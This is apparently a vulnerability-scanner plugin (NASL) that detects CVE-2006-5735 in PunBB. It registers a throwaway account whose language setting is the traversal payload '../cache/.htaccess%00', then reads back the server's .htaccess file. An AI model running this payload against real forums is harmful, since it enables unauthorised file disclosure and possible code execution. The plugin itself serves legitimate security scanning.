if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80080" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-5735" );
	script_bugtraq_id( 20786 );
	script_xref( name: "OSVDB", value: "30132" );
	script_name( "PunBB language Parameter Local File Include Vulnerability" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "punBB_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "punBB/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/450055/30/0/threaded" );
	script_xref( name: "URL", value: "http://forums.punbb.org/viewtopic.php?id=13496" );
	script_tag( name: "solution", value: "Update to version 1.2.14 or later." );
	script_tag( name: "summary", value: "The remote web server contains the PHP script PunBB that is
  affected by a local file include issue." );
	script_tag( name: "insight", value: "The version of PunBB installed on the remote host fails to sanitize
  input to the 'language' parameter before storing it in the 'register.php' script as a user's preferred
  language setting." );
	script_tag( name: "impact", value: "By registering with a specially-crafted value, an attacker can leverage
  this issue to view arbitrary files and possibly execute arbitrary code on the affected host." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
install = get_kb_item( NASLString( "www/", port, "/punBB" ) );
if(isnull( install )){
	exit( 0 );
}
matches = eregmatch( string: install, pattern: "^(.+) under (/.*)$" );
if(!isnull( matches )){
	dir = matches[2];
	install = dir;
	if(dir == "/"){
		dir = "";
	}
	file = "../cache/.htaccess";
	username = rand_str( charset: "abcdefghijklmnopqrstuvwxyz0123456789_", length: 10 );
	password = unixtime();
	email = NASLString( username, "@example.com" );
	url = NASLString( "form_sent=1&req_username=", username, "&req_password1=", password, "&req_password2=", password, "&req_email1=", email, "&timezone=0&language=", file, "%00&email_setting=1&save_pass=1" );
	registeruser = http_post( port: port, item: NASLString( dir, "/register.php" ), data: url );
	registeruser = ereg_replace( string: registeruser, pattern: "Content-Length: ", replace: NASLString( "Content-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " ) );
	reg_response = http_keepalive_send_recv( port: port, data: registeruser, bodyonly: FALSE );
	if(isnull( reg_response ) || !ContainsString( reg_response, "punbb_cookie=" )){
		exit( 0 );
	}
	punbb_cookie = egrep( pattern: "Set-Cookie: punbb_cookie=[a-zA-Z0-9%]*", string: reg_response );
	if(ContainsString( punbb_cookie, "expires" )){
		punbb_cookie = punbb_cookie - strstr( punbb_cookie, "expires" );
		punbb_cookie = ereg_replace( string: punbb_cookie, pattern: "Set-Cookie", replace: "Cookie" );
	}
	if(isnull( punbb_cookie )){
		exit( 0 );
	}
	attackreq = http_get( item: NASLString( dir, "/index.php" ), port: port );
	attackreq = ereg_replace( string: attackreq, pattern: "Accept:", replace: punbb_cookie );
	attackres = http_keepalive_send_recv( port: port, data: attackreq, bodyonly: TRUE );
	if(isnull( attackres )){
		exit( 0 );
	}
	htaccess = "";
	if(ContainsString( attackres, "<Limit GET POST PUT>" )){
		htaccess = attackres;
		if(ContainsString( htaccess, "There is no valid language pack" )){
			htaccess = htaccess - strstr( htaccess, "There is no valid language pack" );
		}
	}
	if(htaccess){
		info = NASLString( "The version of PunBB installed in directory '", install, "'\\n", "is vulnerable to this issue. Here is the contents of 'cache/.htaccess'\\n", "from the remote host: \\n\\n", htaccess );
		security_message( data: info, port: port );
	}
}

